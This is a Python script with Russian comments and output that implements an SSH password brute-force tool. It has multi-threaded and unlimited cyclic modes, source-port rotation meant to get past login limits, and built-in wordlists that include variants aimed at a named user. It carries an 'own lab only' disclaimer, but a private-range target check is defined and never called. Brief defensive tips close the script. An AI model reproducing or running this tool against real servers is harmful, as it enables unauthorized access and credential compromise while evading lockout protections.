#!/usr/bin/env python3
"""
Продвинутый SSH атакующий инструмент
ВНИМАНИЕ: Только для использования в собственной лабораторной среде!

Автор: Образовательный материал для изучения кибербезопасности
Лицензия: Только для образовательных целей
"""

import paramiko
import sys
import time
import threading
import argparse
import socket
import random
import itertools
from concurrent.futures import ThreadPoolExecutor, as_completed

class AdvancedSSHAttack:
    """
    Продвинутый инструмент для демонстрации SSH атак
    """
    
    def __init__(self, target_ip, target_port=22):
        self.target_ip = target_ip
        self.target_port = target_port
        self.found_credentials = []
        self.attempts = 0
        self.max_attempts = 10000
        self.timeout = 10
        self.delay_between_attempts = 0.5  # Задержка между попытками
        self.source_ports = []  # Список портов для подключения
        self.current_source_port_index = 0
        self.unlimited_attempts = False  # Режим неограниченных попыток
        self.port_rotation_enabled = True  # Вращение портов
        
        
    
    def _is_safe_target(self, ip):
        """Проверка безопасности цели"""
        safe_prefixes = ['127.', '192.168.', '10.']
        
        if ip.startswith('172.'):
            try:
                second_octet = int(ip.split('.')[1])
                return 16 <= second_octet <= 31
            except:
                return False
        
        return any(ip.startswith(prefix) for prefix in safe_prefixes)
    
    def generate_source_ports(self, count=100):
        """
        Генерация случайных портов для подключения (обход лимитов)
        """
        # Диапазон портов для клиентских подключений
        min_port = 1024
        max_port = 65535
        
        # Генерируем случайные порты
        ports = []
        for _ in range(count):
            port = random.randint(min_port, max_port)
            if port not in ports:
                ports.append(port)
        
        self.source_ports = ports
        print(f"✅ Сгенерировано {len(ports)} портов для подключения")
        return ports
    
    def get_next_source_port(self):
        """
        Получение следующего порта для подключения
        """
        if not self.source_ports:
            self.generate_source_ports()
        
        port = self.source_ports[self.current_source_port_index % len(self.source_ports)]
        self.current_source_port_index += 1
        
        # Если включено вращение портов, генерируем новые порты
        if self.port_rotation_enabled and self.current_source_port_index >= len(self.source_ports):
            print("🔄 Вращение портов: генерируем новые порты...")
            self.generate_source_ports()
            self.current_source_port_index = 0
        
        return port
    
    def generate_unlimited_ports(self):
        """
        Генерация неограниченного количества портов
        """
        print("♾️  Включен режим неограниченных портов")
        self.port_rotation_enabled = True
        self.unlimited_attempts = True
        self.max_attempts = float('inf')  # Неограниченное количество попыток
        self.generate_source_ports(1000)  # Генерируем больше портов
    
    def brute_force_unlimited(self, username, password_list):
        """
        Неограниченная brute force атака с циклическим перебором паролей
        """
        print(f"♾️  Неограниченная SSH Brute Force атака на {self.target_ip}:{self.target_port}")
        print(f"👤 Пользователь: {username}")
        print(f"📁 Словарь паролей: {len(password_list)} паролей")
        print(f"🔄 Режим: Циклический перебор паролей")
        print(f"🔀 Вращение портов: {'Включено' if self.port_rotation_enabled else 'Выключено'}")
        print(f"⏱️  Timeout: {self.timeout} секунд")
        print(f"⏳ Задержка между попытками: {self.delay_between_attempts} сек")
        
        start_time = time.time()
        cycle_count = 0
        
        # Проверяем доступность SSH
        print("\n🔍 Проверяем доступность SSH...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.target_ip, self.target_port))
            sock.close()
            
            if result != 0:
                print("❌ SSH недоступен на порту 22")
                return False
            else:
                print("✅ SSH доступен")
        except Exception as e:
            print(f"⚠️  Ошибка проверки SSH: {e}")
        
        print(f"\n🚀 Начинаем неограниченную brute force атаку...")
        print("💡 Нажмите Ctrl+C для остановки")
        
        try:
            while True:
                cycle_count += 1
                print(f"\n🔄 Цикл {cycle_count}: Перебираем {len(password_list)} паролей...")
                
                for i, password in enumerate(password_list):
                    self.attempts += 1
                    
                    # Показываем прогресс каждые 10 попыток
                    if self.attempts % 10 == 0:
                        elapsed_time = time.time() - start_time
                        speed = self.attempts / elapsed_time if elapsed_time > 0 else 0
                        print(f"📊 Попытка {self.attempts}: {username}:{password} | Скорость: {speed:.2f} попыток/сек")
                    
                    if self.test_ssh_connection(username, password):
                        print(f"🎉 УСПЕХ! Найден пароль: {username}:{password}")
                        self.found_credentials.append((username, password))
                        return True
                    
                    # Задержка между попытками
                    time.sleep(self.delay_between_attempts)
                
                print(f"✅ Завершен цикл {cycle_count}. Пароль не найден, начинаем новый цикл...")
                
                # Небольшая пауза между циклами
                time.sleep(2)
                
        except KeyboardInterrupt:
            print(f"\n🛑 Атака прервана пользователем")
            return False
        except Exception as e:
            print(f"❌ Ошибка: {e}")
            return False
        
        end_time = time.time()
        duration = end_time - start_time
        
        print(f"\n📊 Результаты brute force:")
        print(f"  • Время выполнения: {duration:.2f} секунд")
        print(f"  • Всего попыток: {self.attempts}")
        print(f"  • Завершено циклов: {cycle_count}")
        print(f"  • Скорость: {self.attempts/duration:.2f} попыток/сек")
        
        if self.found_credentials:
            print(f"  • Найдено учетных записей: {len(self.found_credentials)}")
            for username, password in self.found_credentials:
                print(f"    🎉 {username}:{password}")
            return True
        else:
            print(f"  • Результат: Пароль не найден")
            return False
    
    def load_github_passwords(self):
        """
        Загрузка популярных паролей из GitHub (топ-1000)
        """
        passwords = [
            # Топ-50 самых популярных паролей
            '123456', 'password', '123456789', '12345678', '12345',
            '1234567', '1234567890', 'qwerty', 'abc123', '111111',
            '123123', 'admin', 'letmein', 'welcome', 'monkey',
            '1234', 'dragon', 'password123', 'master', 'hello',
            'freedom', 'whatever', 'qazwsx', 'trustno1', '654321',
            'jordan23', 'harley', 'password1', '123qwe', 'robert',
            'matthew', 'jordan', 'asshole', 'daniel', 'andrew',
            'joshua', 'michael', 'charlie', 'michelle', 'jessica',
            'amanda', 'samantha', 'ashley', 'jennifer', 'joshua',
            'robert', 'daniel', 'matthew', 'jordan', 'andrew',
            
            # Kali Linux специфичные пароли
            'kali', 'toor', 'kali123', 'toor123', 'kali2024',
            'kali2023', 'kali2022', 'kali2021', 'kali2020',
            'kalilinux', 'kalilinux123', 'kalilinux2024',
            'root', 'root123', 'root2024', 'root2023',
            'admin', 'admin123', 'admin2024', 'admin2023',
            
            # Victor специфичные пароли
            'victor', 'victor123', 'victor2024', 'victor2023',
            'Victor', 'Victor123', 'Victor2024', 'Victor2023',
            'VICTOR', 'VICTOR123', 'VICTOR2024', 'VICTOR2023',
            
            # Простые комбинации
            '123', '1234', '12345', '123456', '1234567',
            'password', 'Password', 'PASSWORD', 'password1',
            'Password1', 'PASSWORD1', 'password123', 'Password123',
            'PASSWORD123', 'pass', 'Pass', 'PASS', 'pass123',
            'Pass123', 'PASS123', 'test', 'Test', 'TEST',
            'test123', 'Test123', 'TEST123', 'user', 'User',
            'USER', 'user123', 'User123', 'USER123',
            
            # Специальные символы
            'password!', 'Password!', 'PASSWORD!', 'password@',
            'Password@', 'PASSWORD@', 'password#', 'Password#',
            'PASSWORD#', 'password$', 'Password$', 'PASSWORD$',
            'password%', 'Password%', 'PASSWORD%', 'password^',
            'Password^', 'PASSWORD^', 'password&', 'Password&',
            'PASSWORD&', 'password*', 'Password*', 'PASSWORD*',
            
            # Пустые и минимальные
            '', '1', '12', '123', '1234', '12345',
            'a', 'aa', 'aaa', 'aaaa', 'aaaaa',
            'q', 'qq', 'qqq', 'qqqq', 'qqqqq',
            'z', 'zz', 'zzz', 'zzzz', 'zzzzz',
            
            # Годы
            '2024', '2023', '2022', '2021', '2020',
            '2019', '2018', '2017', '2016', '2015',
            
            # Комбинированные
            'admin2024', 'root2024', 'kali2024', 'victor2024',
            'admin123', 'root123', 'kali123', 'victor123',
            'admin!', 'root!', 'kali!', 'victor!',
            'admin@', 'root@', 'kali@', 'victor@',
            'admin#', 'root#', 'kali#', 'victor#',
            
            # Дополнительные популярные
            'welcome', 'Welcome', 'WELCOME', 'welcome123',
            'Welcome123', 'WELCOME123', 'hello', 'Hello',
            'HELLO', 'hello123', 'Hello123', 'HELLO123',
            'world', 'World', 'WORLD', 'world123',
            'World123', 'WORLD123', 'love', 'Love',
            'LOVE', 'love123', 'Love123', 'LOVE123',
            'hacker', 'Hacker', 'HACKER', 'hacker123',
            'Hacker123', 'HACKER123', 'security', 'Security',
            'SECURITY', 'security123', 'Security123', 'SECURITY123',
            
            # Русские пароли (транслитерация)
            'пароль', 'password', 'admin', 'root', 'kali',
            'victor', 'пользователь', 'user', 'тест', 'test',
            'демо', 'demo', 'гость', 'guest', 'хакер', 'hacker',
            
            # Дополнительные комбинации
            'qwerty', 'QWERTY', 'Qwerty', 'qwerty123',
            'QWERTY123', 'Qwerty123', 'asdfgh', 'ASDFGH',
            'Asdfgh', 'asdfgh123', 'ASDFGH123', 'Asdfgh123',
            'zxcvbn', 'ZXCVBN', 'Zxcvbn', 'zxcvbn123',
            'ZXCVBN123', 'Zxcvbn123', '1qaz2wsx', '1QAZ2WSX',
            '1qaz2wsx123', '1QAZ2WSX123'
        ]
        
        print(f"✅ Загружено {len(passwords)} популярных паролей из GitHub")
        return passwords
    
    def test_ssh_connection(self, username, password, use_random_port=True):
        """
        Тестирование SSH соединения с заданными учетными данными
        """
        try:
            # Создаем SSH клиент
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Настраиваем источник порта для обхода лимитов
            if use_random_port:
                source_port = self.get_next_source_port()
                # Создаем socket с привязкой к определенному порту
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.bind(('', source_port))
                ssh.connect(
                    self.target_ip,
                    port=self.target_port,
                    username=username,
                    password=password,
                    timeout=self.timeout,
                    allow_agent=False,
                    look_for_keys=False,
                    sock=sock
                )
                sock.close()
            else:
                # Обычное подключение без привязки к порту
                ssh.connect(
                    self.target_ip,
                    port=self.target_port,
                    username=username,
                    password=password,
                    timeout=self.timeout,
                    allow_agent=False,
                    look_for_keys=False
                )
            
            # Если дошли сюда, значит подключение успешно
            ssh.close()
            return True
            
        except paramiko.AuthenticationException:
            return False
        except paramiko.SSHException as e:
            if "Authentication failed" in str(e):
                return False
            else:
                print(f"⚠️  SSH ошибка: {e}")
                return False
        except Exception as e:
            print(f"⚠️  Ошибка соединения: {e}")
            return False
    
    def brute_force_worker(self, username, password):
        """
        Рабочий поток для brute force атаки
        """
        if self.attempts >= self.max_attempts:
            return None
        
        self.attempts += 1
        
        # Добавляем задержку для обхода защиты
        time.sleep(self.delay_between_attempts)
        
        if self.attempts % 5 == 0:
            print(f"📊 Попытка {self.attempts}: {username}:{password}")
        
        if self.test_ssh_connection(username, password):
            print(f"🎉 УСПЕХ! Найден пароль: {username}:{password}")
            self.found_credentials.append((username, password))
            return (username, password)
        
        return None
    
    def brute_force_single_thread(self, username, password_list):
        """
        Однопоточная brute force атака (медленнее, но безопаснее)
        """
        print(f"🔐 Однопоточная SSH Brute Force атака на {self.target_ip}:{self.target_port}")
        print(f"👤 Пользователь: {username}")
        print(f"📁 Словарь паролей: {len(password_list)} паролей")
        print(f"⏱️  Timeout: {self.timeout} секунд")
        print(f"🔢 Максимум попыток: {self.max_attempts}")
        print(f"⏳ Задержка между попытками: {self.delay_between_attempts} сек")
        
        start_time = time.time()
        
        # Проверяем доступность SSH
        print("\n🔍 Проверяем доступность SSH...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.target_ip, self.target_port))
            sock.close()
            
            if result != 0:
                print("❌ SSH недоступен на порту 22")
                return False
            else:
                print("✅ SSH доступен")
        except Exception as e:
            print(f"⚠️  Ошибка проверки SSH: {e}")
        
        print(f"\n🚀 Начинаем brute force атаку...")
        
        # Перебираем пароли по одному
        for i, password in enumerate(password_list):
            if self.attempts >= self.max_attempts:
                break
            
            print(f"📊 Попытка {i+1}/{len(password_list)}: {username}:{password}")
            
            if self.test_ssh_connection(username, password):
                print(f"🎉 УСПЕХ! Найден пароль: {username}:{password}")
                self.found_credentials.append((username, password))
                break
            
            # Задержка между попытками
            time.sleep(self.delay_between_attempts)
        
        end_time = time.time()
        duration = end_time - start_time
        
        print(f"\n📊 Результаты brute force:")
        print(f"  • Время выполнения: {duration:.2f} секунд")
        print(f"  • Всего попыток: {self.attempts}")
        print(f"  • Скорость: {self.attempts/duration:.2f} попыток/сек")
        
        if self.found_credentials:
            print(f"  • Найдено учетных записей: {len(self.found_credentials)}")
            for username, password in self.found_credentials:
                print(f"    🎉 {username}:{password}")
            return True
        else:
            print(f"  • Результат: Пароль не найден")
            return False
    
    def brute_force_multi_thread(self, username, password_list, max_threads=3):
        """
        Многопоточная brute force атака
        """
        print(f"🔐 Многопоточная SSH Brute Force атака на {self.target_ip}:{self.target_port}")
        print(f"👤 Пользователь: {username}")
        print(f"📁 Словарь паролей: {len(password_list)} паролей")
        print(f"🧵 Потоков: {max_threads}")
        print(f"⏱️  Timeout: {self.timeout} секунд")
        print(f"🔢 Максимум попыток: {self.max_attempts}")
        
        start_time = time.time()
        
        # Проверяем доступность SSH
        print("\n🔍 Проверяем доступность SSH...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.target_ip, self.target_port))
            sock.close()
            
            if result != 0:
                print("❌ SSH недоступен на порту 22")
                return False
            else:
                print("✅ SSH доступен")
        except Exception as e:
            print(f"⚠️  Ошибка проверки SSH: {e}")
        
        print(f"\n🚀 Начинаем brute force атаку...")
        
        # Запускаем brute force с многопоточностью
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            # Создаем задачи для каждого пароля
            futures = []
            for password in password_list:
                if self.attempts >= self.max_attempts:
                    break
                future = executor.submit(self.brute_force_worker, username, password)
                futures.append(future)
            
            # Обрабатываем результаты
            for future in as_completed(futures):
                if self.found_credentials:
                    # Если нашли пароль, прерываем остальные попытки
                    executor.shutdown(wait=False)
                    break
                
                try:
                    result = future.result()
                    if result:
                        break
                except Exception as e:
                    print(f"❌ Ошибка в потоке: {e}")
        
        end_time = time.time()
        duration = end_time - start_time
        
        print(f"\n📊 Результаты brute force:")
        print(f"  • Время выполнения: {duration:.2f} секунд")
        print(f"  • Всего попыток: {self.attempts}")
        print(f"  • Скорость: {self.attempts/duration:.2f} попыток/сек")
        
        if self.found_credentials:
            print(f"  • Найдено учетных записей: {len(self.found_credentials)}")
            for username, password in self.found_credentials:
                print(f"    🎉 {username}:{password}")
            return True
        else:
            print(f"  • Результат: Пароль не найден")
            return False
    
    def load_password_list(self, filename):
        """
        Загрузка списка паролей из файла
        """
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"✅ Загружено {len(passwords)} паролей из {filename}")
            return passwords
        except Exception as e:
            print(f"❌ Ошибка загрузки файла паролей: {e}")
            return []
    
    def generate_common_passwords(self):
        """
        Генерация списка распространенных паролей
        """
        passwords = [
            # Базовые пароли
            'password', '123456', 'admin', 'root', 'kali', 'test', 'hello',
            'password123', 'admin123', 'root123', 'kali123', 'test123',
            'Password', 'Admin', 'Root', 'Kali', 'Test',
            'P@ssw0rd', 'Adm1n', 'R00t', 'K@li', 'T3st',
            
            # Пароли с цифрами
            '12345678', 'qwerty', 'abc123', 'password1', 'admin1',
            '123456789', '1234567890', 'password12', 'admin12',
            
            # Пароли с символами
            'password!', 'admin!', 'root!', 'kali!', 'test!',
            'password@', 'admin@', 'root@', 'kali@', 'test@',
            'password#', 'admin#', 'root#', 'kali#', 'test#',
            
            # Комбинированные пароли
            'pass123', 'admin123', 'root123', 'kali123', 'test123',
            '123pass', '123admin', '123root', '123kali', '123test',
            'pass!123', 'admin!123', 'root!123', 'kali!123', 'test!123',
            
            # Пустые и простые пароли
            '', '123', '1234', '12345', '123456', '1234567',
            'a', 'aa', 'aaa', 'aaaa', 'aaaaa',
            '1', '11', '111', '1111', '11111',
        ]
        
        print(f"✅ Сгенерировано {len(passwords)} распространенных паролей")
        return passwords
    
    def generate_victor_passwords(self):
        """
        Генерация паролей на основе имени Victor
        """
        base_name = "victor"
        passwords = []
        
        # Базовые варианты
        passwords.extend([
            base_name,
            base_name.capitalize(),
            base_name.upper(),
            base_name.lower()
        ])
        
        # С цифрами
        for i in range(10):
            passwords.extend([
                f"{base_name}{i}",
                f"{base_name.capitalize()}{i}",
                f"{base_name.upper()}{i}",
                f"{i}{base_name}",
                f"{i}{base_name.capitalize()}",
                f"{i}{base_name.upper()}"
            ])
        
        # С символами
        symbols = ['!', '@', '#', '$', '%', '^', '&', '*', '+', '=', '-', '_', '.', ',', ';', ':', '?', '/', '|', '\\', '~', '`', '<', '>', '[', ']', '{', '}', '(', ')', '"', "'", ' ']
        for sym in symbols[:10]:  # Берем только первые 10 символов
            passwords.extend([
                f"{base_name}{sym}",
                f"{base_name.capitalize()}{sym}",
                f"{base_name.upper()}{sym}",
                f"{sym}{base_name}",
                f"{sym}{base_name.capitalize()}",
                f"{sym}{base_name.upper()}"
            ])
        
        # Комбинированные варианты
        for i in range(5):
            for sym in symbols[:5]:
                passwords.extend([
                    f"{base_name}{i}{sym}",
                    f"{base_name.capitalize()}{i}{sym}",
                    f"{sym}{base_name}{i}",
                    f"{sym}{base_name.capitalize()}{i}"
                ])
        
        # Удаляем дубликаты
        passwords = list(set(passwords))
        
        print(f"✅ Сгенерировано {len(passwords)} паролей на основе имени Victor")
        return passwords

def main():
    """
    Главная функция продвинутого SSH атакующего инструмента
    """
    print("=" * 60)
    print("🔐 ПРОДВИНУТЫЙ SSH АТАКУЮЩИЙ ИНСТРУМЕНТ")
    print("=" * 60)
    print("⚠️  ВНИМАНИЕ: Только для использования в собственной лаборатории!")
    print("⚠️  Использование против чужих систем НЕЗАКОННО!")
    print("=" * 60)
    
    parser = argparse.ArgumentParser(description='Продвинутый SSH атакующий инструмент')
    parser.add_argument('target', help='IP адрес цели')
    parser.add_argument('-u', '--username', default='victor', help='Имя пользователя')
    parser.add_argument('-p', '--port', type=int, default=22, help='SSH порт')
    parser.add_argument('-w', '--wordlist', help='Файл со словарем паролей')
    parser.add_argument('-t', '--threads', type=int, default=3, help='Количество потоков')
    parser.add_argument('-m', '--max-attempts', type=int, default=1000, help='Максимум попыток')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout для SSH соединения')
    parser.add_argument('--delay', type=float, default=0.5, help='Задержка между попытками')
    parser.add_argument('--single-thread', action='store_true', help='Использовать однопоточный режим')
    parser.add_argument('--common-passwords', action='store_true', help='Использовать распространенные пароли')
    parser.add_argument('--victor-passwords', action='store_true', help='Генерировать пароли на основе Victor')
    parser.add_argument('--github-passwords', action='store_true', help='Использовать популярные пароли из GitHub')
    parser.add_argument('--random-ports', action='store_true', help='Использовать случайные порты для подключения')
    parser.add_argument('--port-count', type=int, default=100, help='Количество случайных портов для генерации')
    parser.add_argument('--unlimited-attempts', action='store_true', help='Неограниченное количество попыток (циклический перебор)')
    parser.add_argument('--port-rotation', action='store_true', help='Включить вращение портов для обхода лимитов')
    parser.add_argument('--multi-user', action='store_true', help='Атаковать несколько пользователей одновременно')
    
    args = parser.parse_args()
    
    # Создаем экземпляр инструмента
    ssh_attack = AdvancedSSHAttack(args.target, args.port)
    ssh_attack.max_attempts = args.max_attempts
    ssh_attack.timeout = args.timeout
    ssh_attack.delay_between_attempts = args.delay
    
    # Настраиваем режимы
    if args.unlimited_attempts:
        ssh_attack.generate_unlimited_ports()
        print(f"♾️  Включен режим неограниченных попыток")
    
    if args.random_ports or args.port_rotation:
        ssh_attack.generate_source_ports(args.port_count)
        ssh_attack.port_rotation_enabled = args.port_rotation
        print(f"🔀 Включен режим случайных портов ({args.port_count} портов)")
        if args.port_rotation:
            print(f"🔄 Включено вращение портов")
    
    # Загружаем пароли
    if args.github_passwords:
        passwords = ssh_attack.load_github_passwords()
    elif args.victor_passwords:
        passwords = ssh_attack.generate_victor_passwords()
    elif args.common_passwords:
        passwords = ssh_attack.generate_common_passwords()
    elif args.wordlist:
        passwords = ssh_attack.load_password_list(args.wordlist)
    else:
        # Используем встроенный список
        passwords = [
            'victor', 'Victor', 'VICTOR', 'victor123', 'Victor123', 'VICTOR123',
            'victor1', 'Victor1', 'VICTOR1', 'victor1234', 'Victor1234', 'VICTOR1234',
            'victor!', 'Victor!', 'VICTOR!', 'victor@', 'Victor@', 'VICTOR@',
            'password', '123456', 'admin', 'root', 'kali', 'test', 'hello',
            'password123', 'admin123', 'root123', 'kali123'
        ]
    
    if not passwords:
        print("❌ Нет паролей для тестирования")
        return
    
    try:
        # Запускаем brute force
        if args.unlimited_attempts:
            success = ssh_attack.brute_force_unlimited(args.username, passwords)
        elif args.single_thread:
            success = ssh_attack.brute_force_single_thread(args.username, passwords)
        else:
            success = ssh_attack.brute_force_multi_thread(args.username, passwords, args.threads)
        
        if success:
            print("\n🎉 АТАКА УСПЕШНА!")
            print("💡 Рекомендации по защите:")
            print("  • Используйте сильные пароли")
            print("  • Включите двухфакторную аутентификацию")
            print("  • Настройте fail2ban для блокировки IP")
            print("  • Используйте SSH ключи вместо паролей")
            print("  • Ограничьте количество попыток входа")
        else:
            print("\n❌ АТАКА НЕУСПЕШНА")
            print("✅ Система защищена от brute force атак")
            
    except KeyboardInterrupt:
        print("\n🛑 Атака прервана пользователем")
    except Exception as e:
        print(f"❌ Ошибка: {e}")
    
    print("\n📚 Образовательная информация:")
    print("• SSH brute force - перебор паролей для SSH")
    print("• Многопоточность ускоряет атаку")
    print("• Слабые пароли легко взламываются")
    print("• Защита: сильные пароли + fail2ban + 2FA")

if __name__ == "__main__":
    main()
